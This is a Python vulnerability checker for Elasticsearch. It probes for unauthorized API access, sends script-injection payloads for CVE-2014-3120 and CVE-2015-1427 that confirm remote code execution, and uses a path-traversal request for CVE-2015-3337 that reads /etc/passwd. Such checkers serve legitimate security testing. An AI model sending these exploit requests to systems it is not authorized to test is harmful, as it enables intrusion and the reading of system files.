#! /usr/bin/env python
# _*_  coding:utf-8 _*_
 
import requests
import urllib.request

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9200


''' 未授权访问 '''
def Unauthorized_check(ip, port=9200, timeout=5):
    try:
        url = "http://"+ip+":"+str(port)+"/_cat"
        response = requests.get(url)  
    except: 
        print('[-] Elasticsearch: 未找到未授权漏洞')
        return False
        pass
    if "/_cat/master" in response.content.decode('utf-8'):
        print('[+] Elasticsearch: 存在未授权漏洞!')
    else:
        print('[-] Elasticsearch: 未找到未授权漏洞')
        return False
    return True

''' CVE-2014-3120 RCE'''
def cve_2014_3120_rce_check(ip, port=9200, timeout=5):
    url = "http://"+ip+":"+str(port)+"/_search?pretty"

    data = '''{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "37182379+74892374"
        }
    }
}'''
    try:
        response = requests.post(url,data=data)
    except:
        print('[-] Elasticsearch: 未找到漏洞 cve-2014-3120!')
        return False
    if response.status_code == 200 and '112074753' in response.content.decode('utf-8'):
        print('[+] Elasticsearch: 存在漏洞 cve-2014-3120!')
        return True
    else:
        print('[-] Elasticsearch: 未找到漏洞 cve-2014-3120!')
        return False

''' CVE-2015-1427 RCE'''
def cve_2015_1427_rce_check(ip, port=9200, timeout=5):
    url = "http://"+ip+":"+str(port)+"/_search?pretty"

    data = '''{
    "size":1,
    "script_fields": {
       "secpulse": { "script":"372137931+31829038120",
       "lang": "groovy"
    }
  }
}}'''

    try:
        response = requests.post(url,data=data)
    except:
        print('[-] Elasticsearch: 未找到漏洞 cve-2014-3120!')
        return False


    if response.status_code == 200 and '32201176051' in response.content.decode('utf-8'):
        print('[+] Elasticsearch: 存在漏洞 cve-2015-1427!')
        return True
    else:
        print('[-] Elasticsearch: 未找到漏洞 cve-2015-1427!')
        return False

''' CVE-2015-3337 File Read'''
def cve_2015_3337_rce_check(ip, port=9200, timeout=5):
    url = "http://"+ip+":"+str(port)+"/_plugin/../../../../../../../../../../../etc/passwd"

    try:
        response = urllib.request.urlopen("http://"+ip+":"+str(port)+"/_plugin/../../../../../../../../../../../etc/passwd")
    except:
        print('[-] Elasticsearch: 未找到漏洞 cve-2015-3337!')
        return False
    if response.status == 200 and 'root' in response.read().decode('utf-8'):
        print('[+] Elasticsearch: 存在漏洞 cve-2015-3337!')
        return True
    else:
        print('[-] Elasticsearch: 未找到漏洞 cve-2015-3337!')
        return False


if __name__ == '__main__':
    Unauthorized_check(TARGET_IP, TARGET_PORT)
    cve_2014_3120_rce_check(TARGET_IP, TARGET_PORT)
    cve_2015_1427_rce_check(TARGET_IP, TARGET_PORT)
    cve_2015_3337_rce_check(TARGET_IP, TARGET_PORT)
